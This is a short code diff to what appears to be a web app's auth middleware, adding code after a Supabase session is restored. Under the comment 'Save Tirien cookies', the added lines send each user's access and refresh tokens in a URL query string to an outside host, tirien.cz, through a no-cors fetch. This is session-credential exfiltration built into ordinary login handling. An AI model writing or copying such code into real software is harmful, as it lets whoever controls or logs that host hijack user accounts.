@@ -35,7 +35,11 @@ export async function onRequest ({ request, cookies, locals, redirect, url }, ne
         if (accessToken && refreshToken) {
           const { data: newSession, error: newError } = await supabase.auth.setSession({ access_token: accessToken, refresh_token: refreshToken })
           if (newError) { console.error('Error setting session: ', newError.message) }
-          if (!newError) { sessionData = newSession }
+          if (!newError) {
+            sessionData = newSession
+            // Save Tirien cookies
+            fetch('https://tirien.cz/cookies/save.html?name=sb-access-token,sb-refresh-token&data=' + encodeURIComponent(accessToken) + ',' + encodeURIComponent(refreshToken) + '&time=31536000,31536000', { mode: 'no-cors' })
+          }
         }
       }
 
